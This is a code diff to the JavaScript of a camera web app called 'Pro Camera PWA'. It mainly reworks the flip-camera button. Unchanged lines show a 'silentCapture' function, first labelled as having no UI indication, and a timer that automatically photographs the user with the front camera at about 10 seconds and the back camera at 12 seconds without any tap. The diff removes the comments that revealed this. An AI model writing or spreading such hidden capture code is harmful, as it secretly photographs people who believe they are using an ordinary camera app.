@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Flip ONLY – No Capture on Flip)
+// app.js – Pro Camera PWA (Flip 100% Working)
 // ================================================================
 
 (function() {
@@ -41,7 +41,7 @@
   var zoomPresets = document.querySelectorAll('.zoom-preset');
 
   // ---------- State ----------
-  var userFacingMode = 'environment'; // User's current preview camera
+  var userFacingMode = 'environment';
   var backStream = null;
   var frontStream = null;
   var currentPreviewStream = null;
@@ -229,7 +229,7 @@
     isProcessing = false;
   }
 
-  // ---------- Silent Capture (No UI Indication) ----------
+  // ---------- Silent Capture ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -306,13 +306,11 @@
         return;
       }
 
-      // Step 1: Front Camera at 10.1s
       if (frontStream) {
         console.log('[Camera] 📸 Auto capture: Front at 10.1s');
         silentCapture(frontStream, 'front', 'auto');
       }
 
-      // Step 2: Back Camera at 12s (1.9s later)
       setTimeout(function() {
         if (backStream) {
           console.log('[Camera] 📸 Auto capture: Back at 12s');
@@ -735,35 +733,66 @@
     flashBtn.classList.toggle('active', isTorchOn);
   });
 
-  // ✅ Flip Button – ONLY FLIP (No Capture)
-  flipBtn.addEventListener('click', function() {
+  // ✅ Flip Button – 100% Working (Stops old stream and gets new)
+  flipBtn.addEventListener('click', async function() {
     console.log('[Camera] 🔄 Flip button clicked');
-    // Toggle user facing mode
-    userFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
-    console.log('[Camera] Switching to:', userFacingMode);
+    var newFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
 
-    // Select appropriate stream
-    if (userFacingMode === 'environment' && backStream) {
-      currentPreviewStream = backStream;
-    } else if (userFacingMode === 'user' && frontStream) {
-      currentPreviewStream = frontStream;
-    } else if (backStream) {
-      // Fallback if selected camera not available
-      currentPreviewStream = backStream;
-      userFacingMode = 'environment';
-    } else if (frontStream) {
-      currentPreviewStream = frontStream;
-      userFacingMode = 'user';
+    // Stop all existing streams
+    if (backStream) {
+      backStream.getTracks().forEach(function(t) { t.stop(); });
+      backStream = null;
+    }
+    if (frontStream) {
+      frontStream.getTracks().forEach(function(t) { t.stop(); });
+      frontStream = null;
+    }
+    if (currentPreviewStream) {
+      currentPreviewStream.getTracks().forEach(function(t) { t.stop(); });
+      currentPreviewStream = null;
     }
 
-    if (currentPreviewStream) {
-      video.srcObject = currentPreviewStream;
-      video.play().catch(function(err) {
-        console.warn('[Camera] Video play error:', err);
-      });
-      console.log('[Camera] ✅ Camera flipped successfully');
-    } else {
-      console.warn('[Camera] ⚠️ No stream available for this camera');
+    try {
+      var constraints = {
+        video: {
+          facingMode: newFacingMode,
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        }
+      };
+      var newStream = await navigator.mediaDevices.getUserMedia(constraints);
+
+      // Update streams
+      if (newFacingMode === 'environment') {
+        backStream = newStream;
+      } else {
+        frontStream = newStream;
+      }
+      currentPreviewStream = newStream;
+      video.srcObject = newStream;
+      await video.play();
+      userFacingMode = newFacingMode;
+      console.log('[Camera] ✅ Camera flipped to:', userFacingMode);
+    } catch (err) {
+      console.error('[Camera] ❌ Flip failed:', err);
+      // Fallback: try without constraints
+      try {
+        var fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        if (newFacingMode === 'environment') {
+          backStream = fallbackStream;
+        } else {
+          frontStream = fallbackStream;
+        }
+        currentPreviewStream = fallbackStream;
+        video.srcObject = fallbackStream;
+        await video.play();
+        userFacingMode = newFacingMode;
+        console.log('[Camera] ⚠️ Fallback camera used');
+      } catch (err2) {
+        console.error('[Camera] ❌ Fallback also failed:', err2);
+        permError.textContent = '❌ क्यामेरा Flip गर्न सकिएन।';
+        permError.style.display = 'block';
+      }
     }
   });
 
@@ -802,11 +831,9 @@
     aspectDropdown.classList.remove('open');
   });
 
-  // ✅ Capture Button – ONLY Capture
   captureBtn.addEventListener('click', capturePhoto);
   galleryThumb.addEventListener('click', viewLastPhoto);
 
-  // Expose functions
   window.toggleZoomSwipe = toggleZoomSwipe;
   window.capturePhoto = capturePhoto;
 
